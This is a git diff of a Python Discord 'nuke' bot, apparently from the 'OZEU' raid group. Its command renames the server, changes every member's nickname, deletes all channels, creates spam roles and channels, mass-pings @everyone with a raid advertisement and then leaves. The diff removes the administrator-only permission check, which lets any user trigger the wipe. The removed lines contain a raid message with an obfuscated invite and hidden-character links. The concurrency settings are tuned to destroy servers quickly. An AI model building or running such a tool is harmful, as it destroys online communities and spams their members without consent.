@@ -10,43 +10,48 @@ import discord
 from discord.ext import commands
 from flask import Flask, jsonify
 
+# ==================================================
 # ---------------- CONFIG ----------------
 TOKEN = os.environ.get("DISCORD_TOKEN")
 PREFIX = "!"
+
+# --- Intents ---
 INTENTS = discord.Intents.default()
 INTENTS.guilds = True
 INTENTS.messages = True
 INTENTS.message_content = True
 INTENTS.members = True  
 
-# Behavioral params
-ROLE_BASE = "ozeumember" # ロール名
-ROLE_COUNT = 0
-CHANNEL_BASE = "ozeu-nuke" # チャンネル名
-CHANNEL_COUNT = 1
+# --- Names & Counts ---
+GUILD_NEW_NAME         = "おぜう植民地"        # サーバー名
+ROLE_BASE              = "ozeumember"         # ロール名ベース
+ROLE_COUNT             = 1                    # 作成するロール数
+CHANNEL_BASE           = "ozeu-nuke"          # チャンネル名ベース
+CHANNEL_COUNT          = 1                   # 作成するチャンネル数
 
-REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeu-ozeu [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/yNx4Me2) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&) [︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567562863939726/GtZ9HYjbkAA9bPR.webp?ex=684f4334&is=684df1b4&hm=76921f9aff9c6f4b90feaf662c07ca2bb48257ef2bb7fdf39fb5a6df94740967&) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567672725340230/Gri2PLOboAI8ZRV.jpeg?ex=684f434e&is=684df1ce&hm=c28e7c872cdcb1420d8f565211714fa33bef522a879eca292c280439173a9ea2&) [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/NbBGFcf)"
-REPEAT_COUNT = 1  # 各チャンネルに送信する回数
+# --- Messages ---
+REPEAT_MESSAGE         = "@everyone おぜうの集いに参加！ https://example.com"
+REPEAT_COUNT           = 1                    # 各チャンネルに送信する回数
 
-# Nickname & guild rename params
-CHANGE_NICKNAMES = True
-NICK_BASE = "おぜう様万歳！" # 鯖内のメンバーのニックネーム
-NICK_CHUNK_SIZE = 12
-NICK_CHUNK_SLEEP = 0.12
-NEW_GUILD_NAME = "おぜう植民地" # サーバー名
+# --- Nicknames ---
+CHANGE_NICKNAMES       = True
+NICK_BASE              = "おぜう様万歳！"     # ニックネームベース
+NICK_CHUNK_SIZE        = 12
+NICK_CHUNK_SLEEP       = 0.12
 
-# Parallelism / timing
-DELETE_CHUNK_SIZE = 8 # あげると消すのが早くなる
-DELETE_CHUNK_SLEEP = 0.08 # 下げると消すのが早くなる
-CREATE_CHUNK_SIZE = 6 # あげると作るのが早くなる
-CREATE_CHUNK_SLEEP = 0.12 # 下げると作るのが早くなる
-MSG_CHUNK_SIZE = 10 # あげるとメッセが早くなる
-MSG_INTER_CHUNK_SLEEP = 0.01 # 下げるとメッセが早くなる
-MSG_INTER_ROUND_SLEEP = 0.02 # 下げるとメッセが早くなる
-POST_DELETE_WAIT = 2.0
-ROLE_SLEEP = 0.03
+# --- Parallelism / timing ---
+DELETE_CHUNK_SIZE      = 8     # チャンネル削除まとめ数
+DELETE_CHUNK_SLEEP     = 0.08
+CREATE_CHUNK_SIZE      = 6     # チャンネル作成まとめ数
+CREATE_CHUNK_SLEEP     = 0.12
+MSG_CHUNK_SIZE         = 10    # メッセージ送信まとめ数
+MSG_INTER_CHUNK_SLEEP  = 0.01
+MSG_INTER_ROUND_SLEEP  = 0.02
+POST_DELETE_WAIT       = 2.0
+ROLE_CHUNK_SIZE        = 3     # ロール作成まとめ数
+ROLE_SLEEP             = 0.05  # ロール作成の間隔
+# ==================================================
 
-# ---------------------------------------
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("fast-nuke")
 
@@ -78,7 +83,7 @@ async def safe_create_channel(guild: discord.Guild, name: str):
     try:
         ch = await guild.create_text_channel(name)
         logger.info(f"Created channel: {name} ({ch.id})")
-        await asyncio.sleep(0.1)  # 権限反映待ち
+        await asyncio.sleep(0.1)
         return ch
     except Exception as e:
         logger.warning(f"Create failed {name}: {e}")
@@ -144,20 +149,20 @@ def bot_has_permissions(guild: discord.Guild):
     perms = me.guild_permissions
     return perms.manage_channels and perms.manage_roles and perms.send_messages and perms.manage_nicknames
 
-def admin_only():
-    async def predicate(ctx):
-        if ctx.guild is None:
-            return False
-        if ctx.author.guild_permissions.administrator or ctx.author == ctx.guild.owner:
-            return True
-        await ctx.send("管理者またはサーバー所有者のみ実行可能です。")
-        return False
-    return commands.check(predicate)
-
 # --- events ---
 @bot.event
 async def on_ready():
     logger.info(f"Logged in as {bot.user} ({bot.user.id})")
+
+# --- role creation ---
+async def create_roles(guild: discord.Guild, count: int, base: str):
+    roles = []
+    names = [f"{base}-{i}" for i in range(1, count+1)]
+    for group in chunk_list(names, ROLE_CHUNK_SIZE):
+        results = await asyncio.gather(*(guild.create_role(name=nm, permissions=discord.Permissions.none()) for nm in group))
+        roles.extend(results)
+        await asyncio.sleep(ROLE_SLEEP)
+    return roles
 
 # --- main command ---
 @bot.command(name="nuke")
@@ -167,42 +172,34 @@ async def nuke(ctx):
         await ctx.send("Bot に必要な権限がありません。")
         return
 
-    # backup channel
     backup_name = f"nuke-backup-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}"
     backup_channel = await guild.create_text_channel(backup_name)
-    await backup_channel.send("⚙️ nuke 開始（backup channel created）")
+    await backup_channel.send("⚙️ nuke 開始")
 
     # rename guild
-    if NEW_GUILD_NAME:
-        await guild.edit(name=NEW_GUILD_NAME)
-        await backup_channel.send(f"🔁 サーバー名を \"{NEW_GUILD_NAME}\" に変更しました。")
+    if GUILD_NEW_NAME:
+        await guild.edit(name=GUILD_NEW_NAME)
+        await backup_channel.send(f"🔁 サーバー名を \"{GUILD_NEW_NAME}\" に変更しました。")
 
     # change nicknames
     if CHANGE_NICKNAMES:
-        await backup_channel.send("👥 全メンバーのニックネームを変更中...")
+        await backup_channel.send("👥 ニックネーム変更中...")
         changed_count = await change_all_nicknames(guild, NICK_BASE, chunk_size=NICK_CHUNK_SIZE, chunk_sleep=NICK_CHUNK_SLEEP)
         await backup_channel.send(f"👥 ニックネーム変更完了: 成功 {changed_count}")
 
     # delete channels
     channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
-    await backup_channel.send(f"🧹 削除対象: {len(channels_to_delete)} 件")
     for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
         await asyncio.gather(*(safe_delete_channel(c) for c in group))
         await asyncio.sleep(DELETE_CHUNK_SLEEP)
     await asyncio.sleep(POST_DELETE_WAIT)
 
     # create roles
-    created_roles = []
-    await backup_channel.send(f"🔨 ロール {ROLE_COUNT} 個作成")
-    for i in range(1, ROLE_COUNT+1):
-        r = await guild.create_role(name=f"{ROLE_BASE}-{i}", permissions=discord.Permissions.none())
-        created_roles.append(r)
-        await asyncio.sleep(ROLE_SLEEP)
-    await backup_channel.send(f"🔨 ロール作成完了 {len(created_roles)} 個")
+    roles = await create_roles(guild, ROLE_COUNT, ROLE_BASE)
+    await backup_channel.send(f"🔨 ロール作成完了 {len(roles)} 個")
 
     # create channels
     created_channels = []
-    await backup_channel.send(f"🆕 チャンネル {CHANNEL_COUNT} 個作成")
     names = [f"{CHANNEL_BASE}-{i}" for i in range(1, CHANNEL_COUNT+1)]
     for group in chunk_list(names, CREATE_CHUNK_SIZE):
         results = await asyncio.gather(*(safe_create_channel(guild, nm) for nm in group))
@@ -211,12 +208,9 @@ async def nuke(ctx):
     await backup_channel.send(f"🆕 チャンネル作成完了 {len(created_channels)} 件")
 
     # send repeated messages
-    await backup_channel.send(f"✉️ 各チャンネルに同じメッセージを {REPEAT_COUNT} 回送信開始")
     await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)
     await backup_channel.send("✅ nuke 全工程完了")
-    
-    await backup_channel.send("✅ 完了。ボットはサーバーを離脱します。")
-    # small wait to ensure message delivered
+
     await asyncio.sleep(1.0)
     try:
         await guild.leave()
